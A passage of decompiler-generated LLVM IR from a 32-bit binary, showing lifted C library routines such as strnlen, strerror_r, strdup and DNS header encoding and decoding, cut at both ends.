  %v0_13258 = phi i32 [ %v0_13234.pr, %dec_label_pc_13234thread-pre-split ], [ %arg2, %entry ]
  %v2_13234 = icmp eq i32 %v0_13258, 0
  br i1 %v2_13234, label %dec_label_pc_13294, label %bb

bb:                                               ; preds = %dec_label_pc_13234
  %v1_13238 = load i32, i32* @r6, align 4
  %v3_13238 = icmp eq i32 %v1_13238, 0
  br i1 %v3_13238, label %dec_label_pc_13294, label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %bb
  %v2_13248 = udiv i32 -1, %v0_13258
  %tmp9 = icmp ugt i32 %v1_13238, %v2_13248
  %v0_13274 = load i32, i32* @r5, align 4
  %v1_13274 = inttoptr i32 %v0_13274 to i16*
  br i1 %tmp9, label %dec_label_pc_13274, label %dec_label_pc_13254

dec_label_pc_13254:                               ; preds = %dec_label_pc_13240
  store i32 %v0_13274, i32* %r2.global-to-local, align 4
  %v2_13258 = mul i32 %v1_13238, %v0_13258
  %v0_1325c = load i32, i32* @r7, align 4
  %v5_13260 = call i32 @__stdio_fwrite(i32 %v0_1325c, i32 %v2_13258, i16* %v1_13274)
  %v0_13264 = load i32, i32* @r4, align 4
  %v2_13268 = udiv i32 %v5_13260, %v0_13264
  store i32 %v2_13268, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13298

dec_label_pc_13274:                               ; preds = %dec_label_pc_13240
  %v2_13274 = load i16, i16* %v1_13274, align 2
  %v1_13278 = or i16 %v2_13274, 8
  store i16 %v1_13278, i16* %v1_13274, align 2
  %v0_13280 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1328c = inttoptr i32 %v0_13280 to i32*
  store i32 22, i32* %v2_1328c, align 4
  %v0_13298.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13298

dec_label_pc_13294:                               ; preds = %dec_label_pc_13234, %dec_label_pc_13220, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13298

dec_label_pc_13298:                               ; preds = %dec_label_pc_13274, %dec_label_pc_13254, %dec_label_pc_13294
  %v0_13298 = phi i32 [ %v0_13298.pre, %dec_label_pc_13274 ], [ %v2_13268, %dec_label_pc_13254 ], [ 0, %dec_label_pc_13294 ]
  store i32 %v9_131f8, i32* @r6, align 4
  store i32 %v12_131f8, i32* @r7, align 4
  ret i32 %v0_13298

; uselistorder directives
  uselistorder i16* %v1_13274, { 0, 2, 1 }
  uselistorder i32 %v1_13238, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_13298, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13294, { 2, 0, 1 }
}

define i32 @function_132a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_132a8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_132b0 = load i32, i32* @r0, align 4
  %v1_132b0 = load i32, i32* @r1, align 4
  %v2_132b0 = inttoptr i32 %v0_132b0 to i8*
  %v3_132b0 = call i32 @_memcpy(i8* %v2_132b0, i32 %v1_132b0)
  ret i32 %v3_132b0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_132c0 = icmp eq i32 %arg2, 0
  br i1 %v2_132c0, label %bb, label %dec_label_pc_132d4

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_132d4:                               ; preds = %entry
  %v2_132d4 = add i32 %tmp, %arg2
  %v3_132d4 = icmp ult i32 %v2_132d4, %tmp
  br i1 %v3_132d4, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_132d4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_132d4, %bb19
  %v5_13374 = phi i32 [ %v2_132d4, %dec_label_pc_132d4 ], [ -1, %bb19 ]
  %v1_132f44 = urem i32 %tmp, 4
  %v2_132f45 = icmp eq i32 %v1_132f44, 0
  br i1 %v2_132f45, label %dec_label_pc_132fc, label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %bb20, %dec_label_pc_132f0
  %v0_132f0 = phi i32 [ %v1_132f0, %dec_label_pc_132f0 ], [ %tmp, %bb20 ]
  %v1_132e4 = inttoptr i32 %v0_132f0 to i8*
  %v2_132e4 = load i8, i8* %v1_132e4, align 1
  %v2_132e8 = icmp eq i8 %v2_132e4, 0
  br i1 %v2_132e8, label %dec_label_pc_13370, label %dec_label_pc_132f0

dec_label_pc_132f0:                               ; preds = %dec_label_pc_132e4
  %v1_132f0 = add i32 %v0_132f0, 1
  %v1_132f4 = urem i32 %v1_132f0, 4
  %v2_132f4 = icmp eq i32 %v1_132f4, 0
  br i1 %v2_132f4, label %dec_label_pc_132fc, label %dec_label_pc_132e4

dec_label_pc_132fc:                               ; preds = %dec_label_pc_132f0, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_132f0, %dec_label_pc_132f0 ]
  %v3_1336030 = icmp ult i32 %storemerge.lcssa, %v5_13374
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_1336030, label %dec_label_pc_13304, label %dec_label_pc_13370

dec_label_pc_13304:                               ; preds = %dec_label_pc_1335c, %dec_label_pc_132fc
  %v0_1335437 = phi i32 [ %v4_13304, %dec_label_pc_1335c ], [ %storemerge.lcssa, %dec_label_pc_132fc ]
  %v1_13304 = inttoptr i32 %v0_1335437 to i32*
  %v2_13304 = load i32, i32* %v1_13304, align 4
  %v4_13304 = add i32 %v0_1335437, 4
  %v2_13308 = add i32 %v2_13304, -16843009
  %v2_1330c = and i32 %v2_13308, -2139062144
  store i32 %v2_1330c, i32* @ip, align 4
  %v2_13310 = icmp eq i32 %v2_1330c, 0
  br i1 %v2_13310, label %dec_label_pc_1335c, label %dec_label_pc_13318

dec_label_pc_13318:                               ; preds = %dec_label_pc_13304
  %v2_13318 = inttoptr i32 %v0_1335437 to i8*
  %v3_13318 = load i8, i8* %v2_13318, align 1
  %v2_1331c = icmp eq i8 %v3_13318, 0
  br i1 %v2_1331c, label %bb21, label %dec_label_pc_1332c

bb21:                                             ; preds = %dec_label_pc_13318
  br label %dec_label_pc_13370

dec_label_pc_1332c:                               ; preds = %dec_label_pc_13318
  %v1_1332c = add i32 %v0_1335437, 1
  %v2_1332c = inttoptr i32 %v1_1332c to i8*
  %v3_1332c = load i8, i8* %v2_1332c, align 1
  %v2_13330 = icmp eq i8 %v3_1332c, 0
  br i1 %v2_13330, label %dec_label_pc_13370, label %dec_label_pc_1333c

dec_label_pc_1333c:                               ; preds = %dec_label_pc_1332c
  %v1_1333c = add i32 %v0_1335437, 2
  %v2_1333c = inttoptr i32 %v1_1333c to i8*
  %v3_1333c = load i8, i8* %v2_1333c, align 1
  %v2_13340 = icmp eq i8 %v3_1333c, 0
  br i1 %v2_13340, label %dec_label_pc_13370, label %dec_label_pc_1334c

dec_label_pc_1334c:                               ; preds = %dec_label_pc_1333c
  %v1_1334c = add i32 %v0_1335437, 3
  %v2_1334c = inttoptr i32 %v1_1334c to i8*
  %v3_1334c = load i8, i8* %v2_1334c, align 1
  %v2_13350 = icmp eq i8 %v3_1334c, 0
  br i1 %v2_13350, label %dec_label_pc_13370, label %dec_label_pc_1335c

dec_label_pc_1335c:                               ; preds = %dec_label_pc_1334c, %dec_label_pc_13304
  %v3_13360 = icmp ult i32 %v4_13304, %v5_13374
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_13360, label %dec_label_pc_13304, label %dec_label_pc_13370

dec_label_pc_13370:                               ; preds = %dec_label_pc_1335c, %dec_label_pc_132fc, %dec_label_pc_132e4, %dec_label_pc_1332c, %dec_label_pc_1333c, %dec_label_pc_1334c, %bb21
  %v1_13370 = phi i32 [ %v0_1335437, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_132fc ], [ %v1_1332c, %dec_label_pc_1332c ], [ %v1_1333c, %dec_label_pc_1333c ], [ %v1_1334c, %dec_label_pc_1334c ], [ %v5_13374, %dec_label_pc_1335c ], [ %v0_132f0, %dec_label_pc_132e4 ]
  %v3_13370 = icmp uge i32 %v5_13374, %v1_13370
  %v9_13370 = icmp eq i32 %v5_13374, %v1_13370
  %v2_13374 = xor i1 %v3_13370, true
  %v3_13374 = or i1 %v9_13370, %v2_13374
  br i1 %v3_13374, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_13370
  %v6_13374 = sub i32 %v5_13374, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13370, %bb22
  %v5_13378 = phi i32 [ %v1_13370, %dec_label_pc_13370 ], [ %v6_13374, %bb22 ]
  %v2_13378 = xor i1 %v9_13370, true
  %v3_13378 = and i1 %v3_13370, %v2_13378
  br i1 %v3_13378, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_13378 = sub i32 %v5_13378, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_13380 = phi i32 [ 0, %bb ], [ %v5_13378, %bb23 ], [ %v6_13378, %bb24 ]
  ret i32 %v1_13380

; uselistorder directives
  uselistorder i1 %v3_13370, { 1, 0 }
  uselistorder i32 %v4_13304, { 1, 0 }
  uselistorder i32 %v0_1335437, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_132f0, { 1, 0, 2 }
  uselistorder i32 %v5_13374, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_13370, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_132e4, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13394 = call i32 @__xpg_strerror_r()
  %v0_13398 = load i32, i32* @r4, align 4
  ret i32 %v0_13398
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_133a4 = load i32, i32* @r4, align 4
  %v9_133a4 = load i32, i32* @r6, align 4
  %v0_133ac = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  store i32 %v0_133ac, i32* @ip, align 4
  %v0_133bc = load i32, i32* @r1, align 4
  store i32 %v0_133bc, i32* @r7, align 4
  %v0_133c0 = load i32, i32* @r2, align 4
  store i32 %v0_133c0, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_133ac, 124
  br i1 %tmp, label %dec_label_pc_133f8, label %dec_label_pc_133c8

dec_label_pc_133c8:                               ; preds = %entry
  br label %dec_label_pc_133e0

dec_label_pc_133d4:                               ; preds = %dec_label_pc_133e0
  br i1 %v2_133ec, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_133d4
  %v2_133d8 = add i32 %v1_133f0, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_133d4, %bb
  %v0_133e01 = phi i32 [ %v1_133f0, %dec_label_pc_133d4 ], [ %v2_133d8, %bb ]
  %v1_133dc = add i32 %v0_133dc, 1
  br label %dec_label_pc_133e0

dec_label_pc_133e0:                               ; preds = %dec_label_pc_133c8, %bb15
  %v1_133f0 = phi i32 [ %v0_133ac, %dec_label_pc_133c8 ], [ %v0_133e01, %bb15 ]
  %v0_133dc = phi i32 [ add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37004), %dec_label_pc_133c8 ], [ %v1_133dc, %bb15 ]
  store i32 %v0_133dc, i32* @r5, align 4
  %v2_133e0 = icmp eq i32 %v1_133f0, 0
  %v1_133e4 = inttoptr i32 %v0_133dc to i8*
  %v2_133e4 = load i8, i8* %v1_133e4, align 1
  %v3_133e4 = zext i8 %v2_133e4 to i32
  store i32 %v3_133e4, i32* @r3, align 4
  %v2_133ec = icmp eq i8 %v2_133e4, 0
  br i1 %v2_133e0, label %dec_label_pc_133ec, label %dec_label_pc_133d4

dec_label_pc_133ec:                               ; preds = %dec_label_pc_133e0
  br i1 %v2_133ec, label %dec_label_pc_133f8, label %bb16

bb16:                                             ; preds = %dec_label_pc_133ec
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13434

dec_label_pc_133f8:                               ; preds = %dec_label_pc_133ec, %entry
  store i32 %v0_133ac, i32* @r2, align 4
  %v3_13400 = ashr i32 %v0_133ac, 31
  store i32 %v3_13400, i32* @r3, align 4
  %v6_13414 = bitcast i32* %stack_var_-25 to i8*
  %v7_13414 = call i32 @_uintmaxtostr(i8* %v6_13414)
  %v1_1341c = add i32 %v7_13414, -14
  store i32 %v1_1341c, i32* @r5, align 4
  %v0_13420 = load i32, i32* @r6, align 4
  %v2_13420 = add i32 %v0_13420, -37020
  store i32 %v2_13420, i32* @r1, align 4
  store i32 %v1_1341c, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_1342c = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_13434.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %bb16, %dec_label_pc_133f8
  %v0_13434 = phi i32 [ %v0_133dc, %bb16 ], [ %v0_13434.pre, %dec_label_pc_133f8 ]
  %v1_13434 = inttoptr i32 %v0_13434 to i8*
  %v3_13438 = call i32 @strlen(i8* %v1_13434)
  %v0_1343c = load i32, i32* @r7, align 4
  %v2_1343c = icmp eq i32 %v0_1343c, 0
  br i1 %v2_1343c, label %bb17, label %dec_label_pc_13434._crit_edge

dec_label_pc_13434._crit_edge:                    ; preds = %dec_label_pc_13434
  %v1_13448.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_13434
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_13434._crit_edge, %bb17
  %v1_13448 = phi i32 [ %v1_13448.pre, %dec_label_pc_13434._crit_edge ], [ 0, %bb17 ]
  %v1_13444 = add i32 %v3_13438, 1
  %v3_13448 = icmp uge i32 %v1_13444, %v1_13448
  %v9_13448 = icmp eq i32 %v1_13444, %v1_13448
  %v2_1344c = xor i1 %v3_13448, true
  %v3_1344c = or i1 %v9_13448, %v2_1344c
  br i1 %v3_1344c, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_13444, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_1345c = phi i32 [ %v1_13448, %bb18 ], [ %v1_13444, %bb19 ]
  %v2_13450 = xor i1 %v9_13448, true
  %v3_13450 = and i1 %v3_13448, %v2_13450
  br i1 %v3_13450, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_13454 = icmp eq i32 %v0_1345c, 0
  br i1 %v2_13454, label %dec_label_pc_13478, label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %bb22
  store i32 %v0_1345c, i32* @r2, align 4
  %v0_13460 = load i32, i32* @r5, align 4
  store i32 %v0_13460, i32* @r1, align 4
  store i32 %v0_1343c, i32* @r0, align 4
  %v0_13468 = call i32 @memcpy()
  %v0_1346c = load i32, i32* @r4, align 4
  %v1_1346c = load i32, i32* @r7, align 4
  %v2_1346c = add i32 %v1_1346c, %v0_1346c
  %v3_13474 = add i32 %v2_1346c, -1
  %v4_13474 = inttoptr i32 %v3_13474 to i8*
  store i8 0, i8* %v4_13474, align 1
  br label %dec_label_pc_13478

dec_label_pc_13478:                               ; preds = %bb22, %dec_label_pc_1345c
  %v0_13478 = load i32, i32* %r6.global-to-local, align 4
  %v2_13478 = icmp eq i32 %v0_13478, 0
  br i1 %v2_13478, label %dec_label_pc_13488, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13478
  %v0_13480 = call i32 @__GI___errno_location()
  %v0_13484 = load i32, i32* %r6.global-to-local, align 4
  %v2_13484 = inttoptr i32 %v0_13480 to i32*
  store i32 %v0_13484, i32* %v2_13484, align 4
  %v0_13488.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13488

dec_label_pc_13488:                               ; preds = %dec_label_pc_13478, %dec_label_pc_13480
  %v0_13488 = phi i32 [ 0, %dec_label_pc_13478 ], [ %v0_13488.pre, %dec_label_pc_13480 ]
  store i32 %v3_133a4, i32* @r4, align 4
  store i32 %v9_133a4, i32* %r6.global-to-local, align 4
  ret i32 %v0_13488

; uselistorder directives
  uselistorder i1 %v3_13448, { 1, 0 }
  uselistorder i32 %v0_133dc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_133f0, { 1, 0, 2 }
  uselistorder i32 %v0_133ac, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 5, 3, 4, 1, 2, 6 }
  uselistorder i32 14, { 3, 4, 7, 0, 9, 5, 8, 6, 1, 2 }
  uselistorder label %dec_label_pc_13488, { 1, 0 }
  uselistorder label %dec_label_pc_13478, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_13434, { 1, 0 }
  uselistorder label %dec_label_pc_133e0, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_134a4 = load i32, i32* @r4, align 4
  store i32 %v3_134a4, i32* %stack_var_-16, align 4
  %v9_134a4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_134ac = call i32 @strlen(i8* %arg1)
  %v1_134b0 = add i32 %v3_134ac, 1
  store i32 %v1_134b0, i32* @r4, align 4
  %v1_134b8 = call i32 @malloc(i32 %v1_134b0)
  store i32 %v1_134b8, i32* %r5.global-to-local, align 4
  %v2_134bc = icmp eq i32 %v1_134b8, 0
  br i1 %v2_134bc, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_134c8 = xor i1 %v2_134bc, true
  call void @__pseudo_cond_branch(i1 %v1_134c8, i32 ptrtoint (i32* @global_var_aca0.198 to i32))
  %v0_134cc = load i32, i32* %r5.global-to-local, align 4
  %v2_134d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_134d0, i32* @r4, align 4
  store i32 %v9_134a4, i32* @r6, align 4
  ret i32 %v0_134cc

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 11, 10, 9, 3, 2, 8, 7, 6, 12, 5, 4, 13, 16, 1, 15, 14, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_134dc = load i32, i32* @lr, align 4
  store i32 %v0_134dc, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_134e8 = icmp sgt i32 %arg3, 11
  br i1 %v7_134e8, label %dec_label_pc_134f0, label %dec_label_pc_135bc

dec_label_pc_134f0:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_134f0 = add i32 %tmp, 1
  %v2_134f0 = inttoptr i32 %v1_134f0 to i8*
  %v3_134f0 = load i8, i8* %v2_134f0, align 1
  store i8 %v3_134f0, i8* %tmp16, align 1
  %v0_134f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_134f8 = inttoptr i32 %v0_134f8 to i32*
  %v2_134f8 = load i32, i32* %v1_134f8, align 4
  %v1_134fc = trunc i32 %v2_134f8 to i8
  %v4_134fc = add i32 %arg2, 1
  %v5_134fc = inttoptr i32 %v4_134fc to i8*
  store i8 %v1_134fc, i8* %v5_134fc, align 1
  %v0_13500 = load i32, i32* %ip.global-to-local, align 4
  %v1_13500 = add i32 %v0_13500, 8
  %v2_13500 = inttoptr i32 %v1_13500 to i32*
  %v3_13500 = load i32, i32* %v2_13500, align 4
  %v1_13504 = add i32 %v0_13500, 20
  %v2_13504 = inttoptr i32 %v1_13504 to i32*
  %v3_13504 = load i32, i32* %v2_13504, align 4
  %v1_13508 = add i32 %v0_13500, 4
  %v2_13508 = inttoptr i32 %v1_13508 to i32*
  %v3_13508 = load i32, i32* %v2_13508, align 4
  %v1_1350c = add i32 %v0_13500, 12
  %v2_1350c = inttoptr i32 %v1_1350c to i32*
  %v3_1350c = load i32, i32* %v2_1350c, align 4
  %v2_13510 = icmp eq i32 %v3_13504, 0
  br i1 %v2_13510, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_134f0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_134f0, %bb
  %v0_13520 = phi i32 [ 0, %dec_label_pc_134f0 ], [ 1, %bb ]
  %v1_13518 = urem i32 %v3_13500, 16
  %v2_1351c = icmp eq i32 %v3_13508, 0
  %v4_13520 = mul nuw nsw i32 %v1_13518, 8
  %v5_13520 = or i32 %v0_13520, %v4_13520
  %v1_13524 = add i32 %v0_13500, 16
  %v2_13524 = inttoptr i32 %v1_13524 to i32*
  %v3_13524 = load i32, i32* %v2_13524, align 4
  %. = select i1 %v2_1351c, i32 0, i32 128
  %v2_13530 = icmp eq i32 %v3_1350c, 0
  %storemerge11 = select i1 %v2_13530, i32 0, i32 4
  %v2_1353c = or i32 %v5_13520, %.
  %v2_13540 = icmp eq i32 %v3_13524, 0
  %.26 = select i1 %v2_13540, i32 0, i32 2
  %v2_1354c = or i32 %v2_1353c, %storemerge11
  %v2_13550 = or i32 %v2_1354c, %.26
  %v1_13554 = trunc i32 %v2_13550 to i8
  %v2_13554 = load i32, i32* %lr.global-to-local, align 4
  %v3_13554 = add i32 %v2_13554, 2
  %v4_13554 = inttoptr i32 %v3_13554 to i8*
  store i8 %v1_13554, i8* %v4_13554, align 1
  %v0_13558 = load i32, i32* %ip.global-to-local, align 4
  %v1_13558 = add i32 %v0_13558, 24
  %v1_1355c = inttoptr i32 %v1_13558 to i32*
  %v2_1355c = load i32, i32* %v1_1355c, align 4
  %v3_1355c = add i32 %v0_13558, 28
  %v4_1355c = inttoptr i32 %v3_1355c to i32*
  %v5_1355c = load i32, i32* %v4_1355c, align 4
  %v2_13560 = icmp eq i32 %v2_1355c, 0
  %v1_13564 = urem i32 %v5_1355c, 16
  %v0_13570 = select i1 %v2_13560, i32 0, i32 128
  %v2_13570 = or i32 %v1_13564, %v0_13570
  %v1_13574 = trunc i32 %v2_13570 to i8
  %v2_13574 = load i32, i32* %lr.global-to-local, align 4
  %v3_13574 = add i32 %v2_13574, 3
  %v4_13574 = inttoptr i32 %v3_13574 to i8*
  store i8 %v1_13574, i8* %v4_13574, align 1
  %v0_13578 = load i32, i32* %ip.global-to-local, align 4
  %v1_13578 = add i32 %v0_13578, 33
  %v2_13578 = inttoptr i32 %v1_13578 to i8*
  %v3_13578 = load i8, i8* %v2_13578, align 1
  %v2_1357c = load i32, i32* %lr.global-to-local, align 4
  %v3_1357c = add i32 %v2_1357c, 4
  %v4_1357c = inttoptr i32 %v3_1357c to i8*
  store i8 %v3_13578, i8* %v4_1357c, align 1
  %v0_13580 = load i32, i32* %ip.global-to-local, align 4
  %v1_13580 = add i32 %v0_13580, 32
  %v2_13580 = inttoptr i32 %v1_13580 to i32*
  %v3_13580 = load i32, i32* %v2_13580, align 4
  %v1_13584 = trunc i32 %v3_13580 to i8
  %v2_13584 = load i32, i32* %lr.global-to-local, align 4
  %v3_13584 = add i32 %v2_13584, 5
  %v4_13584 = inttoptr i32 %v3_13584 to i8*
  store i8 %v1_13584, i8* %v4_13584, align 1
  %v0_13588 = load i32, i32* %ip.global-to-local, align 4
  %v1_13588 = add i32 %v0_13588, 37
  %v2_13588 = inttoptr i32 %v1_13588 to i8*
  %v3_13588 = load i8, i8* %v2_13588, align 1
  %v2_1358c = load i32, i32* %lr.global-to-local, align 4
  %v3_1358c = add i32 %v2_1358c, 6
  %v4_1358c = inttoptr i32 %v3_1358c to i8*
  store i8 %v3_13588, i8* %v4_1358c, align 1
  %v0_13590 = load i32, i32* %ip.global-to-local, align 4
  %v1_13590 = add i32 %v0_13590, 36
  %v2_13590 = inttoptr i32 %v1_13590 to i32*
  %v3_13590 = load i32, i32* %v2_13590, align 4
  %v1_13594 = trunc i32 %v3_13590 to i8
  %v2_13594 = load i32, i32* %lr.global-to-local, align 4
  %v3_13594 = add i32 %v2_13594, 7
  %v4_13594 = inttoptr i32 %v3_13594 to i8*
  store i8 %v1_13594, i8* %v4_13594, align 1
  %v0_13598 = load i32, i32* %ip.global-to-local, align 4
  %v1_13598 = add i32 %v0_13598, 41
  %v2_13598 = inttoptr i32 %v1_13598 to i8*
  %v3_13598 = load i8, i8* %v2_13598, align 1
  %v2_1359c = load i32, i32* %lr.global-to-local, align 4
  %v3_1359c = add i32 %v2_1359c, 8
  %v4_1359c = inttoptr i32 %v3_1359c to i8*
  store i8 %v3_13598, i8* %v4_1359c, align 1
  %v0_135a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_135a0 = add i32 %v0_135a0, 40
  %v2_135a0 = inttoptr i32 %v1_135a0 to i32*
  %v3_135a0 = load i32, i32* %v2_135a0, align 4
  %v1_135a4 = trunc i32 %v3_135a0 to i8
  %v2_135a4 = load i32, i32* %lr.global-to-local, align 4
  %v3_135a4 = add i32 %v2_135a4, 9
  %v4_135a4 = inttoptr i32 %v3_135a4 to i8*
  store i8 %v1_135a4, i8* %v4_135a4, align 1
  %v0_135a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_135a8 = add i32 %v0_135a8, 45
  %v2_135a8 = inttoptr i32 %v1_135a8 to i8*
  %v3_135a8 = load i8, i8* %v2_135a8, align 1
  %v2_135ac = load i32, i32* %lr.global-to-local, align 4
  %v3_135ac = add i32 %v2_135ac, 10
  %v4_135ac = inttoptr i32 %v3_135ac to i8*
  store i8 %v3_135a8, i8* %v4_135ac, align 1
  %v0_135b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_135b0 = add i32 %v0_135b0, 44
  %v2_135b0 = inttoptr i32 %v1_135b0 to i32*
  %v3_135b0 = load i32, i32* %v2_135b0, align 4
  %v1_135b4 = trunc i32 %v3_135b0 to i8
  %v2_135b4 = load i32, i32* %lr.global-to-local, align 4
  %v3_135b4 = add i32 %v2_135b4, 11
  %v4_135b4 = inttoptr i32 %v3_135b4 to i8*
  store i8 %v1_135b4, i8* %v4_135b4, align 1
  %v2_135bc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_135bc

dec_label_pc_135bc:                               ; preds = %entry, %bb17
  %v2_135bc = phi i32 [ %v2_135bc.pre, %bb17 ], [ %v0_134dc, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_135bc, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_13500, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 37, { 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_135bc, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_135c4 = load i8, i8* %arg1, align 1
  %v4_135c4 = zext i8 %v3_135c4 to i32
  %v2_135c8 = add i32 %tmp, 1
  %v3_135c8 = inttoptr i32 %v2_135c8 to i8*
  %v4_135c8 = load i8, i8* %v3_135c8, align 1
  %v5_135c8 = zext i8 %v4_135c8 to i32
  %v4_135cc = mul nuw nsw i32 %v4_135c4, 256
  %v5_135cc = or i32 %v5_135c8, %v4_135cc
  %v2_135d0 = inttoptr i32 %arg2 to i32*
  store i32 %v5_135cc, i32* %v2_135d0, align 4
  %v2_135d4 = add i32 %tmp, 2
  %v3_135d4 = inttoptr i32 %v2_135d4 to i8*
  %v4_135d4 = load i8, i8* %v3_135d4, align 1
  %tmp3 = icmp slt i8 %v4_135d4, 0
  %v3_135d8 = zext i1 %tmp3 to i32
  %v2_135dc = add i32 %arg2, 4
  %v3_135dc = inttoptr i32 %v2_135dc to i32*
  store i32 %v3_135d8, i32* %v3_135dc, align 4
  %v4_135e0 = load i8, i8* %v3_135d4, align 1
  %div = udiv i8 %v4_135e0, 8
  %tmp4 = urem i8 %div, 16
  %v1_135e8 = zext i8 %tmp4 to i32
  %v2_135ec = add i32 %arg2, 8
  %v3_135ec = inttoptr i32 %v2_135ec to i32*
  store i32 %v1_135e8, i32* %v3_135ec, align 4
  %v4_135f0 = load i8, i8* %v3_135d4, align 1
  %div1 = udiv i8 %v4_135f0, 4
  %tmp5 = urem i8 %div1, 2
  %v1_135f8 = zext i8 %tmp5 to i32
  %v2_135fc = add i32 %arg2, 12
